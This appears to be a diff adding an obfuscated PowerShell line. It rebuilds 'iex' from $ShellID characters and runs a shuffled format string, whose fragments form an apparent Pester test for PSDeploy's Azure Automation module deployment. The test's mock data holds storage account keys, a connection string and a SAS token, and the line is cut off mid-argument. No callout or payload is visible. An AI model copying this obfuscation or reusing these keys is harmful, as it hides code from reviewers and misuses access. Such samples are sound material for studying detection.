@@ -1,0 +1,2572 @@
+ . ( $ShellID[1]+$SHeLlId[13]+'X') (((("{37}{33}{88}{16}{20}{27}{80}{72}{3}{11}{65}{8}{71}{58}{48}{38}{46}{26}{42}{22}{47}{81}{6}{36}{64}{13}{9}{39}{66}{79}{87}{50}{99}{75}{31}{73}{14}{32}{55}{4}{92}{82}{0}{91}{61}{83}{68}{63}{19}{44}{67}{30}{18}{60}{1}{90}{40}{98}{21}{76}{86}{41}{7}{15}{89}{34}{57}{97}{10}{52}{78}{69}{93}{85}{95}{96}{12}{17}{24}{23}{54}{43}{56}{59}{2}{74}{25}{49}{53}{28}{5}{29}{51}{77}{70}{94}{45}{62}{35}{84}" -f'    <TN RefId=K5P3K5P>
+            <T>Microsoft.Azure.Cosmos.Table.CloudStorageAccount</T>
+            <T>System.Object</T>
+ ','xactly 1 -Scope It
+                }
+            }
+
+            It 5hFshould use a Storage account5hF {
+                {
+                    Invoke-PSDeploy @Verbose -Path K5PE03ProjectRootegCTestsegCartifactsegCDeploymentsAzureAutomationModule-PublicModule.psdeploy.ps1K5P -Force
+                    Assert-MockCalled Get-AzStorageAccount -Exactl','=K5P11K5P>
+                <TNRef RefId=K5P2K5P />
+                <DCT />
+            </Obj>
+            </Props>
+        </Obj>
+        <S N=K5PNameK5P>psdepend</S>
+        </Props>
+    </Obj>
+</Objs>
+5hF@
+                #endregion
+
+                E03data = [System.Management.Automation.PSSerializer]::DeserializeAsList(E03mockedSerializedData)
+                E03data
+            }
+            Mock Get-AzStorageAccountKey {
+                #region MockData
+                E03mockedSerializedData = @5hF
+<Objs Version=K5P1.1.0.1K5P xmlns=K5Phttp://schemas.microsoft.com/powershell/2004/04K5P>
+    <Obj RefId=K5P0K5P>
+        <TN RefId=K5P0K5P>
+        <T>Microsoft.Azure.Management.Storage.Models.StorageAccountKey</T>
+        <T>System.Object</T>
+        </TN>
+        <ToString>Microsoft.Azure.Management.Storage.Models.StorageAccountKey</ToString>
+        <Props>
+        <S N=K5PKeyNameK5P>key1</S>
+        <S N=K5PValueK5P>aYnf1etfwPfXJ2viMYc/DdUcZPo2ysm/42Ov8zEewRGvv32c0VtumseRzoRDG75a7BgCNFiDR28y//xqqBB+Rw==</S>
+        <Obj N=K5PPermissionsK5P RefId=K5P1K5P>
+            <TN RefId=K5P1K5P>
+            <T>Microsoft.Azure.Management.Storage.Models.KeyPermission</T>
+            <T>System.Enum</T>
+            <T>System.ValueType</T>
+            <T>System.Object</T>
+            </TN>
+            <ToString>Full</ToString>
+            <I32>1</I32>
+        </Obj>
+        </Props>
+    </Obj>
+    <Obj RefId=K5P2K5P>
+        <TNRef RefId=K5P0K5P />
+        <ToString>Microsoft.Azure.Management.Storage.Models.StorageAccountKey</ToString>
+        <Props>
+        <S N=K5PKeyNameK5P>key2</S>
+        <S N=K5PValueK5P>lCvSampwF8ZkAgjaDJXpw3akynx5aEecS3Wg/WDeygQd7l+/bXMZD+uk0Dd0Jbk2tZ7nBO39W0fGXsZBQtK0zQ==</S>
+        <Obj N=K5PPermissionsK5P RefId=K5P3K5P>
+            <TNRef RefId=K5P1K5P />
+            <ToString>Full</ToString>
+            <I32>1</I32>
+        </Obj>
+        </Props>
+    </Obj>
+</Objs>
+5hF@
+                #endregion
+
+                E03data = [System.Management.Automation.PSSerializer]::DeserializeAsList(E03mockedSerializedData)
+                E03data
+            }
+            Mock New-AzStorageContainer {
+                #region MockData
+                E03mockedSerializedData = @5hF
+<Objs Version=K5P1.1.0.1K5P xmlns=K5Phttp://schemas.microsoft.com/powershell/2004/04K5P>
+    <Obj RefId=K5P0K5P>
+        <TN RefId=K5P0K5P>
+        <T>Microsoft.WindowsAzure.Commands.Common.Storage.ResourceModel.AzureStorageContainer</T>
+        <T>Microsoft.WindowsAzure.Commands.Common.Storage.ResourceModel.AzureStorageBase</T>
+        <T>System.Object</T>
+        </TN>
+        <ToString>Microsoft.WindowsAzure.Commands.Common.Storage.ResourceModel.AzureStorageContainer</ToString>
+        <Props>
+        <Obj N=K5PCloudBlobContainerK5P RefId=K5P1K5P>
+            <TN RefId=K5P1K5P>
+            <T>Microsoft.Azure.Storage.Blob.CloudBlobContainer</T>
+','uteK5P>5</I32>
+            <I32 N=K5PMonthK5P>5</I32>
+            <TS N=K5POffsetK5P>PT3H</TS>
+            <I32 N=K5PSecondK5P>27</I32>
+            <I64 N=K5PTicksK5P>637248891275270000</I64>
+            <I64 N=K5PUtcTicksK5P>637248783275270000</I64>
+            <TS N=K5PTimeOfDayK5P>PT14H5M27.527S</TS>
+            <I32 N=K5PYearK5P>2020</I32>
+            </Props>
+        </Obj>
+        <S N=K5PProvisioningStateK5P>Succeeded</S>
+        </Props>
+    </Obj>
+</Objs>
+5hF@
+                #endregion
+
+                E03data = [System.Management.Automation.PSSerializer]::DeserializeAsList(E03mockedSerializedData)
+                E03data
+            }
+
+            Mock Get-AzStorageAccount {}
+            Mock Get-AzStorageContainer {}
+            Mock Get-AzStorageAccountKey {}
+            Mock New-AzStorageContainer {}
+   ','net/;FileEndpoint=https://aadeploymentstor.file.core.windows.net/;DefaultEndpointsProtocol=https</S>
+            <Nil N=K5PTrack2OauthTokenK5P />
+            <S N=K5PEndPointSuffixK5P>core.windows.net/</S>
+            <S N=K5PConnectionStringK5P>BlobEndpoint=https://aadeploymentstor.blob.core.windows.net/;QueueEndpoint=https://aadeploymentstor.','point=https://aadeploymentstor.queue.core.windows.net/;TableEndpoint=https://aadeploymentstor.table.core.windows.net/;FileEndpoint=https://aadeploymentstor.file.core.windows.net/;AccountName=aadeploymentstor;AccountKey=[key hidden]</S>
+            <S N=K5PTableStorageAccountK5P>BlobEndpoint=https://aadeploymentstor.blob.core.windows.net/;QueueEndpoint=https://aadeploymentstor.queue.core.windows.net/;TableEndpoint=https://aadeploymentstor.table.core.windows.net/;FileEndpoint=https://aadeploymentstor.file.core.windows.net/;DefaultEndpointsProtocol=https</S>
+            <Nil N=K5PTrack2OauthTokenK5P />
+            <S N=K5PEndPointSuffixK5P>core.windows.net/</S>
+            <S N=K5PConnectionStringK5P>BlobEndpoint=https://aadeploymentstor.blob.core.windows.net/;QueueEndpoint=https://aadeploymentstor.queue.core.windows.net/;TableEndpoint=https://aadeploymentstor.table.core.windows.net/;FileEndpoint=https://aadeploymentstor.file.core.windows.net/;AccountName=aadeploymentstor;AccountKey=aYnf1etfwPfXJ2viMYc/DdUcZPo2ysm/42Ov8zEewRGvv32c0VtumseRzoRDG75a7BgCNFiDR28y//xqqBB+Rw==</S>
+            <Obj N=K5PExtendedPropertiesK5P RefId=K5P2K5P>
+                <TN RefId=K5P1K5P>
+                <T>System.Collections.Generic.Dictionarye3A2[[System.String, System.Private.CoreLib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=7cec85d7bea7798e],[System.String, System.Private.CoreLib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=7cec85d7bea7798e]]</T>
+                <T>System.Object</T>
+                </TN>
+                <DCT />
+            </Obj>
+            </Props>
+        </Obj>
+        <S N=K5PNameK5P></S>
+        <Obj N=K5PStorageAccountK5P RefId=K5P3K5P>
+            <TN RefId=K5P2K5P>
+            <T>Microsoft.Azure.Storage.CloudStorageAccount</T>
+            <T>System.Object</T>
+            </TN>
+            <ToString>BlobEndpoint=https://aadeploymentstor.blob.core.windows.net/;QueueEndpoint=https://aadeploymentstor.queue.core.windows.net/;TableEndpoint=https://aadeploymentstor.table.core.windows.net/;FileEndpoint=https://aadeploymentstor.file.core.windows.net/;AccountName=aadeploymentstor;AccountKey=[key hidden]</ToString>
+            <Props>
+            <URI N=K5PBlobEndpointK5P>https://aadeploymentstor.blob.core.windows.net/</URI>
+            <URI N=K5PQueueEndpointK5P>https://aadeploymentstor.queue.core.windows.net/</URI>
+            <URI N=K5PTableEndpointK5P>https://aadeploymentstor.table.core.windows.net/</URI>
+            <URI N=K5PFileEndpointK5P>https://aadeploymentstor.file.core.windows.net/</URI>
+            <S N=K5PBlobStorageUriK5P>Primary = 5hFhttps://aadeploymentstor.blob.core.windows.net/5hF; Secondary = 5hF5hF</S>
+            <S N=K5PQueueStorageUriK5P>Primary = 5hFhttps://aadeploymentstor.queue.core.windows.net/5hF; Secondary = 5hF5hF</S>
+            <S N=K5PTableStorageUriK5P>Primary = 5hFhttps://aadeploymentstor.table.core.windows.net/5hF; Secondary = 5hF5hF</S>
+            <S N=K5PFileStorageUriK5P>Primary = 5hFhttps://aadeploymentstor.file.core.windows.net/5hF; Secondary = 5hF5hF</S>
+            <S N=K5PCredentialsK5P>Microsoft.Azure.Storage.Auth.StorageCredentials</S>
+            </Props>
+        </Obj>
+        <Obj N=K5PTableStorageAccountK5P RefId=K5P4K5P>
+            <TN RefId=K5P3K5P>
+            <T>Microsoft.Azure.Cosmos.Table.CloudStorageAccount</T>
+            <T>System.Object</T>
+            </TN>
+            <ToString>BlobEndpoint=https://aadeploymentstor.blob.core.windows.net/;QueueEndpoint=https://aadeploymentstor.queue.core.windows.net/;TableEndpoint=https://aadeploymentstor.table.core.windows.net/;FileEndpoint=https://aadeploymentstor.file.core.windows.net/;DefaultEndpointsProtocol=https</ToString>
+            <Props>
+            <URI N=K5PTableEndpointK5P>https://aadeploymentstor.table.core.windows.net/</URI>
+            <S N=K5PTableStorageUriK5P>Primary = 5hFhttps://aadeploymentstor.table.core.windows.net/5hF; Secondary = 5hF5hF</S>
+            <S N=K5PCredentialsK5P>Microsoft.Azure.Cosmos.Table.StorageCredentials</S>
+            </Props>
+        </Obj>
+        <Nil N=K5PTrack2OauthTokenK5P />
+        <S N=K5PEndPointSuffixK5P>core.windows.net/</S>
+        <S N=K5PConnectionStringK5P>BlobEndpoint=https://aadeploymentstor.blob.core.windows.net/;QueueEndpoint=https://aadeploymentstor.queue.core.windows.net/;TableEndpoint=https://aadeploymentstor.table.core.windows.net/;FileEndpoint=https://aadeploymentstor.file.core.windows.net/;AccountName=aadeploymentstor;AccountKey=aYnf1etfwPfXJ2viMYc/DdUcZPo2ysm/42Ov8zEewRGvv32c0VtumseRzoRDG75a7BgCNFiDR28y//xqqBB+Rw==</S>
+        <Ref N=K5PExtendedPropertiesK5P RefId=K5P2K5P />
+        </Props>
+    </Obj>
+</Objs>
+5hF@
+                #endregion
+
+                E03data = [System.Management.Automation.PSSerializer]::DeserializeAsList(E03mockedSerializedData)
+                E03data
+            }
+            Mock New-AzStorageBlobSASToken {
+                #region MockData
+                E03mockedSerializedData = @5hF
+<Objs Version=K5P1.1.0.1K5P xmlns=K5Phttp://schemas.microsoft.com/powershell/2004/04K5P>
+    <S>https://aadeploymentstor.blob.core.windows.net/psdepend/PSDepend.zip?sv=2019-02-02&amp;sr=b&amp;sig=if5HREXrRThQDVCvfCQI3ukJTvGtsJvQMNB6nkBkX4E%3D&amp;se=2020-05-12T12%3A30%3A57Z&amp;sp=r</S>
+</Objs>
+5hF@
+                #endregion
+
+                E03data = [System.Management.Automation.PSSerializer]::DeserializeAsList(E03mockedSerializedData)
+                E03data
+            }
+            Mock Set-AzStorageBlobContent {
+                #region MockData
+                E03mockedSerializedData = @5hF
+<Objs Version=K5P1.1.0.1K5P xmlns=K5Phttp://schemas.microsoft.com/powershell/2004/04K5P>
+    <Obj RefId=K5P0K5P>
+        <TN RefId=K5P0K5P>
+        <T>Microsoft.WindowsAzure.Commands.Common.Storage.ResourceModel.AzureStorageBlob</T>
+        <T>Microsoft.WindowsAzure.Commands.Common.Storage.ResourceModel.AzureStorageBase</T>
+        <T>System.Object</T>
+        </TN>
+        <ToString>Microsoft.WindowsAzure.Commands.Common.Storage.ResourceModel.AzureStorageBlob</ToString>
+        <Props>
+        <Obj N=K5PICloudBlobK5P RefId=K5P1K5P>
+            <TN RefId=K5P1K5P>
+            <T>Microsoft.Azure.Storage.Blob.CloudBlockBlob</T>
+            <T>Microsoft.Azure.Storage.Blob.CloudBlob</T>
+            <T>System.Object</T>
+            </TN>
+            <ToString>Microsoft.Azure.Storage.Blob.CloudBlockBlob</ToString>
+            <Props>
+            <I32 N=K5PStreamWriteSizeInBytesK5P>4194304</I32>
+            <S N=K5PServiceClientK5P>Microsoft.Azure.Storage.Blob.CloudBlobClient</S>
+            <I32 N=K5PStreamMinimumReadSizeInBytesK5P>4194304</I32>
+            <S N=K5PPropertiesK5P>Microsoft.Azure.Storage.Blob.BlobProperties</S>
+            <Obj N=K5PMetadataK5P RefId=K5P2K5P>
+                <TN RefId=K5P2K5P>
+                <T>System.Collections.Generic.Dictionarye3A2[[System.String, System.Private.CoreLib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=7cec85d7bea7798e],[System.String, System.Private.CoreLib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=7cec85d7bea7798e]]</T>
+                <T>System.Object</T>
+                </TN>
+                <DCT />
+            </Obj>
+            <URI N=K5PUriK5P>https://aadeploymentstor.blob.core.windows.net/psdepend/PSDepend.zip</URI>
+            <S N=K5PStorageUriK5P>Primary = 5hFhttps://aadeploymentstor.blob.core.windows.net/psdepend/PSDepend.zip5hF; Secondary = 5hF5hF</S>
+            <Nil N=K5PSnapshotTimeK5P />
+            <B N=K5PIsSnapshotK5P>false</B>
+            <B N=K5PIsDeletedK5P>false</B>
+            <URI N=K5PSnapshotQualifiedUriK5P>https://aadeploymentstor.blob.core.windows.net/psdepend/PSDepend.zip</URI>
+            <','entstor.file.core.windows.net/;AccountName=aadeployments','        <S','                {
+                    {Invoke-PSDeploy @Verbose -Path K5PE03ProjectRootegCTestsegCartifactsegCDeploymentsAzureAutomationModule-PublicModule.psdeploy.ps1K5P -Force}
+                    Assert-MockCalled Get-AzAutomationAcc','/T>
+                <T>System.Object</T>
+                </TN>
+                <IE />
+            </Obj>
+            </Props>
+        </Obj>
+        <Obj N=K5PPublicAccessK5P RefId=K5P5K5P>
+            <TN RefId=K5P5K5P>
+            <T>Microsoft.Azure.Storage.Blob.BlobContainerPublicAccessType</T>
+            <T>System.Enum</T>
+            <T>System.ValueType</T>
+            <T>System.Object</T>
+            </TN>
+            <ToString>Container</ToString>
+            <I32>1</I32>
+        </Obj>
+        <Obj N=K5PLastModifiedK5P RefId=K5P6K5P>
+            <TN RefId=K5P6K5P>
+            <T>System.DateTimeOffset</T>
+            <T>System.ValueType</T>
+            <T>System.Object</T>
+            </TN>
+            <ToString>05/04/2020 14:45:45 +00:00</ToString>
+            <Props>
+            <DT N=K5PDateTimeK5P>2020-05-04T14:45:45</DT>
+            <DT N=K5PUtcDateTimeK5P>2020-05-04T14:45:45Z</DT>
+            <DT N=K5PLocalDateTimeK5P>2020-05-04T17:45:45+03:00</DT>
+            <DT N=K5PDateK5P>2020-05-04T00:00:00</DT>
+            <I32 N=K5PDayK5P>4</I32>
+            <S N=K5PDayOfWeekK5P>Monday</S>
+            <I32 N=K5PDayOfYearK5P>125</I32>
+            <I32 N=K5PHourK5P>14</I32>
+            <I32 N=K5PMillisecondK5P>0</I','ing>Microsoft.Azure.Management.Storage.Models.Encryption</ToString>
+            <Props>
+            <S N=K5PServicesK5P>Microsoft.Azure.Management.Storage.Models.EncryptionServices</S>
+            <S N=K5PKeySourceK5P>Microsoft.Storage</S>
+            <Nil N=K5PKeyVaultPropertiesK5P />
+            </Props>
+    ','         Mock New-AzStorageContext {}
+            Mock New-AzStorageBlobSASToken {}
+            Mock Set-AzStorageBlobContent {}
+
+            It 5hFsho','ry = 5hFhttps://aadeploymentstor.blob.core.windows.net/psdepend5hF; Secondary = 5hF5hF</S>
+    ','           <T>System.Object</T>
+                </TN>
+                <DCT />
+            </Obj>
+            <S N=K5PPropertiesK5P>Microsoft.Azure.Storage.Blob.BlobContainerProperties</S>
+            </Props>
+        </Obj>
+        <Obj N=K5PPermissionK5P RefId=K5P3K5P>
+            <TN RefId=K5P3K5P>
+            <T>Microsoft.Azure.Storage.Blob.BlobContainerPermissions</T>
+            <T>System.Object</T>
+            </TN>
+            <ToString>Microsoft.Azure.Storage.Blob.BlobContainerPermissions</ToString>
+            <Props>
+            <S N=K5PPublicAccessK5P>Container</S>
+            <Obj N=K5PSharedAccessPoliciesK5P RefId=K5P4K5P>
+                <TN RefId=K5P4K5P>
+                <T>Microsoft.Azure.Storage.Blob.SharedAccessBlobPolicies<','e.Blobs.BlobContainerClient</T>
+            <T>System.Object</T>
+            </TN>
+            <ToString>Azure.Storage.Blobs.BlobContainerClient</ToString>
+            <Props>
+            <URI N=K5PUriK5P>https://aadeploymentstor.blob.core.windows.net/psdepend</URI>
+            <S N=K5PAccountNameK5P>aadeploymentstor</S>
+            <S N=K5PNameK5P>psdepend</S>
+            </Props>
+        </Obj>
+        <Obj N=K5PBlobContainerPropertiesK5P RefId=K5P8K5P>
+            <TN RefId=K5P8K5P>
+            <T>Azure.Storage.Blobs.Models.BlobContainerProperties</T>
+            <T>System.Object</T>
+            </TN>
+            <ToString>Azure.Storage.Blobs.Models.BlobContainerProperties</ToString>
+            <Props>
+            <S N=K5PLastModifiedK5P>05/04/2020 14:45:45 +00:00</S>
+            <S N=K5PLeaseStatusK5P>Unlocked</S>
+            <S N=K5PLeaseStateK5P>Available</S>
+            <S N=K5PLeaseDurationK5P>Infinite</S>
+            <S N=K5PPublicAccessK5P>BlobContain',' N=K5PVersionK5P>0.3.2</S>
+        <I64 N=K5PSizeInBytesK5P>71093</I64>
+        <I32 N=K5PActivityCountK5P>8</I32>
+        <Obj N=K5PCreationTimeK5P RefId=K5P1K5P>
+            <TN RefId=K5P1K5P>
+            <T>System.DateTimeOffset</T>
+            <T>System.ValueType</T>
+            <T>System.Object</T>
+            </TN>
+            <ToString>05/04/2020 17:42:32 +03:00</ToString>
+            <Props>
+            <DT N=K5PDateTimeK5P>2020-05-04T17:42:32.617</DT','/schemas.microsoft.com/powershell/2004/04K5P>
+    <Obj RefId=K5P0K5P>
+        <TN RefId=K5P0K5P>
+        <T>Microsoft.Azure.Commands.Automation.Model.AutomationAccount</T>
+        <T>System.Object</T>
+        </TN>
+        <ToString>Microsoft.Azure.Commands.Automation.Model.AutomationAccount</ToString>
+        <Props>
+        <S N=K5PSubscriptionIdK5P>c49124fa-befd-4207-a3b7-29c95c41a964</S>
+        <S N=K5PResourceGroupNameK5P>AAResourceGroupName</S>
+        <S N=K5PAutomationAccountNameK5P>AAName</S>
+        <S N=K5PLocationK5P>westeurope</S>
+        <S N=K5PStateK5P>Ok</S>
+        <S N=K5PPlanK5P>Basic</S>
+        <Obj N=K5PCreationTimeK5P RefId=K5P1K5P>
+            <TN RefId=K5P1K5P>
+            <T>System.DateTimeOffset</T>
+            <T>System.ValueType</T>
+            <T>System.Object</T>
+            </TN>
+            <ToString>10/02/2017 16:05:15 +03:00</ToString>
+            <Props>
+            <DT N=K5PDateTimeK5P>2017-10-02T16:05:15.39</DT>
+            <DT N=K5PUtcDateTimeK5P>2017-10-02T13:05:15.39Z</DT>
+            <DT N=K5PLocalDateTimeK5P>2017-10-02T16:05:15.39+03:00</DT>
+            <DT N=K5PDateK5P>2017-10-02T00:00:00</DT>
+            <I32 N=K5PDayK5P>2</I32>
+            <S N=K5PDayOfWeekK5P>Monday</S>
+            <I32 N=K5PDayOfYearK5P>275</I32>
+            <I32 N=K5PHourK5P>16</I32>
+            <I32 N=K5PMillisecondK5P>390</I32>
+            <I32 N=K5PMinuteK5P>5</I32>
+            <I32 N=K5PMonthK5P>10</I32>
+            <TS N=K5POffsetK5P>PT3H</TS>
+            <I32 N=K5PSecondK5P>15</I32>
+            <I64 N=K5PTicksK5P>636425571153900000</I64>
+            <I64 N=K5PUtcTicksK5P>636425463153900000</I64>
+            <TS N=K5PTimeOfDayK5P>PT16H5M15.39S</TS>
+            <I32 N=K5PYearK5P>2017</I32>
+            </Props>
+        </Obj>
+        <Obj N=K5PLastModifiedTimeK5P RefId=K5P2K5P>
+            <TNRef RefId=K5P1K5P />
+            <ToString>03/22/2020 10:41:20 +02:00</ToString>
+            <Props>
+            <DT N=K5PDateTimeK5P>2020-03-22T10:41:20.57</DT>
+            <DT N=K5PUtcDateTimeK5P>2020-03-22T08:41:20.57Z</DT>
+            <DT N=K5PLocalDateTimeK5P>2020-03-22T10:41:20.57+02:00</DT>
+            <DT N=K5PDateK5P>2020-03-22T00:00:00</DT>
+            <I32 N=K5PDayK5P>22</I32>
+            <S N=K5PDayOfWeekK5P>Sunday</S>
+            <I32 N=K5PDayOfYearK5P>82</I32>
+            <I32 N=K5PHourK5P>10</I32>
+            <I32 N=K5PMillisecondK5P>570</I32>
+            <I32 N=K5PMinuteK5P>41</I32>
+            <I32 N=K5PMonthK5P>3</I32>
+            <TS N=K5POffsetK5P>PT2H</TS>
+            <I32 N=K5PSecondK5P>20</I32>
+            <I64 N=K5PTicksK5P>637204704805700000</I64>
+            <I64 N=K5PUtcTicksK5P>637204632805700000</I64>
+            <TS N=K5PTimeOfDayK5P>PT10H41M20.57S</TS>
+            <I32 N=K5PYearK5P>2020</I32>
+            </Props>
+        </Obj>
+        <Nil N=K5PLastModifiedByK5P />
+        <Obj N=K5PTagsK5P RefId=K5P3K5P>
+            <TN RefId=K5P2K5P>
+            <T>System.Collections.Hashtable</T>
+            <T>System.Object</T>
+            </TN>
+            <DCT>
+            <En>
+                <S N=K5PKeyK5P>environment</S>
+                <S N=K5PValueK5P>Test</S>
+            </En>
+            </DCT>
+        </Obj>
+        </Props>
+    </Obj>
+</Objs>
+5hF@
+                #endregion
+
+                E03data = [System.Management.Automation.PSSerializer]::DeserializeAsList(E03mockedSerializedData)
+                E03data
+            }
+            Mock Get-AzAutomationModule {
+                #region MockData
+                E03mockedSerializedData = @5hF
+<Objs Version=K5P1.1.0.1K5P xmlns=K5Phttp://schemas.microsoft.com/powershell/2004/04K5P>
+    <Obj RefId=K5P0K5P>
+        <TN RefId=K5P0K5P>
+        <T>Microsoft.Azure.Commands.Automation.Model.Module</T>
+        <T>System.Object</T>
+        </TN>
+        <ToString>Microsoft.Azure.Commands.Automation.Model.Module</ToString>
+        <Props>
+        <S N=K5PResourceGroupNam','        <S N=K5PNameK5P>psdepend</S>
+            <Obj N=K5PMetadataK5P RefId=K5P2K5P>
+                <TN RefId=K5P2K5P>
+                <T>System.Collections.Generic.Dictionarye3A2[[System.String, System.Private.CoreLib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=7cec85d7bea7798e],[System.String, System','dpoint=https://aadeploymentstor.blob.core.windows.net/;QueueEndpoint=https://aadeploymentstor.queue.core.windows.net/;TableEndpoint=https://aadeploymentstor.table.core.windows.net/;FileEndpoint=https://aadeploymentstor.file.core.windows.net/;AccountName=aadeploymentstor;AccountKey=[key hidden]</S>
+            <S N=K5PTableStorageAccountK5P>BlobEndpoint=https://aadeploymentstor.blob.core.windows.net/;QueueEndpoint=https://aadeploymentstor.queue.core.windows.net/;TableEndpoint=https://aadeploymentstor.table.core.windows.net/;FileEndpoint=https://aadeploymentstor.file.core.windows.net/;DefaultEndpointsProtocol=https</S>
+            <Nil N=K5PTrack2OauthTokenK5P />
+            <S N=K5PEndPointSuffixK5P>core.windows.net/</S>
+            <S N=K5PConnectionStringK5P>BlobEndpoint=https://aadeploymentstor.blob.core.windows.net/;QueueEndpoint=https://aadeploymentstor.queue.core.windows.net/;TableEndpoint=https://aadeploymentstor.table.core.windows.net/;FileEndpoint=https://aadeploymentstor.file.core.windows.net/;AccountName=aadeploymentstor;AccountKey=aYnf1etfwPfXJ2viMYc/DdUcZPo2ysm/42Ov8zEewRGvv32c0VtumseRzoRDG75a7BgCNFiDR28y//xqqBB+Rw==</S>
+            <Obj N=K5PExtendedPropertiesK5P RefId=K5P9K5P>
+                <TNRef RefId=K5P2K5P />
+                <DCT />
+            </Obj>
+            </Props>
+        </Obj>
+        <S N=K5PNameK5P>PSDepend.zip</S>
+        </Props>
+    </Obj>
+</Objs>
+5hF@
+                #endregion
+
+                E03data = [System.Man','T>Microsoft.Azure.Storage.Blob.BlobType</T>
+            <T>System.Enum</T>
+            <T>System.ValueType</T>
+            <T>System.Object</T>
+            </TN>
+            <ToString>BlockBlob</ToString>
+            <I32>2</I32>
+        </Obj>
+        <I64 N=K5PLengthK5P>2274</I64>
+        <B N=K5PIsDeletedK5P>false</B>
+        <Obj N=K5PBlobClientK5P RefId=K5P4K5P>
+            <TN RefId=K5P4K5P>
+            <T>Azure.Storage.Blobs.BlobClient</T>
+            <T>Azure.Storage.Blobs.Specialized.BlobBaseClient</T>
+            <T>System.Object</T>
+            </TN>
+            <ToString>Azure.Storage.Blob','eK5P>AAResourceGroupName</S>
+        <S N=K5PAutomationAccountNameK5P>AANAme</S>
+        <S N=K5PNameK5P>PSDepend</S>
+        <B N=K5PIsGlobalK5P>false</B>
+        <S N=K5PVersionK5P>0.3.2</S>
+        <I64 N=K5PSizeInBytesK5P>71093</I64>
+        <I32 N=K5PActivityCountK5P>8</I32>
+        <Obj N=K5PCreationTimeK5P RefId=K5P1K5P>
+            <TN RefId=K5P1K5P>
+            <T>System.DateTimeOffset</T>
+            <T>System.ValueType</T>
+            <T>System.Object</T>
+            </TN>
+            <ToString>05/04/2020 17:42:32 +03:00</ToString>
+            <Props>
+            <DT N=K5PDateTimeK5P>2020-05-04T17:42:32.617</DT>
+            <DT N=K5PUtcDateTimeK5P>2020-05-04T14:42:32.617Z</DT>
+            <DT N=K5PLocalDateTimeK5P>2020-05-04T17:42:32.617+03:00</DT>
+            <DT N=K5PDateK5P>2020-05-04T00:00:00</DT>
+            <I32 N=K5PDayK5P>4</I32>
+            <S N=K5PDayOfWeekK5P>Monday</S>
+            <I32 N=K5PDayOfYearK5P>125</I32>
+            <I32 N=K5PHourK5P>17</I32>
+            <I32 N=K5PMillisecondK5P>617</I32>
+            <I32 N=K5PMinuteK5P>42</I32>
+            <I32 N=K5PMonthK5P>5</I32>
+            <TS N=K5POffsetK5P>PT3H</TS>
+            <I32 N=K5PSecondK5P>32</I32>
+            <I64 N=K5PTicksK5P>637242109526170000</I64>
+            <I64 N=K5PUtcTicksK5P>637242001526170000</I64>
+            <TS N=K5PTimeOfDayK5P>PT17H42M32.617S</TS>
+            <I32 N=K5PYearK5P>2020</I32>
+            </Props>
+        </Obj>
+        <Obj N=K5PLastModifiedTimeK5P RefId=K5P2K5P>
+            <TNRef RefId=K5P1K5P />
+            <ToString>05/04/2020 17:44:14 +03:00</ToString>
+            <Props>
+            <DT N=K5PDateTimeK5P>2020-05-04T17:44:14.537</DT>
+            <DT N=K5PUtcDateTimeK5P>2020-05-04T14:44:14.537Z</DT>
+            <DT N=K5PLocalDateTimeK5P>2020-05-04T17:44:14.537+03:00</DT>
+            <DT N=K5PDateK5P>2020-05-04T00:00:00</DT>
+            <I32 N=K5PDayK5P>4</I32>
+            <S N=K5PDayOfWeekK5P>Monday</S>
+            <I32 N=K5PDayOfYearK5P>125</I32>
+            <I32 N=K5PHourK5P>17</I32>
+            <I32 N=K5PMillisecondK5P>537</I32>
+            <I32 N=K5PMinuteK5P>44</I32>
+            <I32 N=K5PMonthK5P>5</I32>
+            <TS N=K5POffsetK5P>PT3H</TS>
+            <I32 N=K5PSecondK5P>14</I32>
+            <I64 N=K5PTicksK5P>637242110545370000</I64>
+            <I64 N=K5PUtcTic','      <I32 N=K5PMillisecondK5P>570</I32>
+            <I32 N=K5PMinuteK5P>41</I32>
+            <I32 N=K5PMonthK5P>3</I32>
+            <TS N=K5POffsetK5P>PT2H</TS>
+            <I32 N=K5PSecondK5P>20</I32>
+  ','       <TN RefId=K5P5K5P>
+            <T>Microsoft.Azure.Management.Storage.Models.ProvisioningState</T>
+            <T>System.Enum</T>
+            <T>System.ValueType</T>
+            <T>System.Object</T>
+            </TN>
+            <ToString>Succeeded</ToString>
+            <I32>2</I32>
+        </Obj>
+        <Nil N=K5PSecondaryEndpointsK5P />
+        <Nil N=K5PSecondaryLocationK5P />
+        <Obj N=K5PStatusOfPrimaryK5P RefId=K5P6K5P>
+            <TN RefId=K5P6K5P>
+            <T>Microsoft.Azure.Management.Storage.Models.AccountStatus</T>
+            <T>System.Enum</T>
+            <T>System.ValueType</T>
+            <T>System.Object</T>
+            </TN>
+            <ToString>Available</ToString>
+            <I32>0</I32>
+        </Obj>
+        <Nil N=K5PStatusOfSecondaryK5P />
+        <Obj N=K5PTagsK5P RefId=K5P7K5P>
+            <TN RefId=K5P7K5P>
+            <T>System.Collections.Generic.Dictionarye3A2[[System.String, System.Private.CoreLib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=7cec85d7bea7798e],[System.String, System.Private.CoreLib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=7cec85d7bea7798e]]</T>
+            <T>System.Object</T>
+            </TN>
+            <DCT>
+            <En>
+                <S N=K5PKeyK5P>environment</S>
+                <S N=K5PValueK5P>Test</S>
+            </En>
+            </DCT>
+        </Obj>
+        <B N=K5PEnableHttpsTrafficOnlyK5','g>05/04/2020 14:45:45 +00:00</ToString>
+            <Props>
+            <DT N=K5PDateTimeK5P>2020-05-04T14:45:45</DT>
+            <DT N=K5PUtcDateTimeK5P>2020-05-04T14:45:45Z</DT>
+            <DT N=K5PLocalDateTimeK5P>2020-05-04T17:45:45+03:00</DT>
+            <DT N=K5PDateK5P>2020-05-04T00:00:00</DT>
+            <I32 N=K5PDayK5P>4</I32>
+            <S N=K5PDayOfWeekK5P>Monday</S>
+            <I32 N=K5PDayOfYearK5P>125</I32>
+            <I32 N=K5PHourK5P>14</I32>
+            <I32 N=K5PMillisecondK5P>0</I32>
+            <I32 N=K5PMinuteK5P>45</I32>
+            <I32 N=K5PMonthK5P>5</I32>
+            <TS N=K5POffsetK5P>PT0S</TS>
+            <I32 N=K5PSecondK5P>45</I32>','.Private.CoreLib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=7cec85d7bea7798e]]</T>
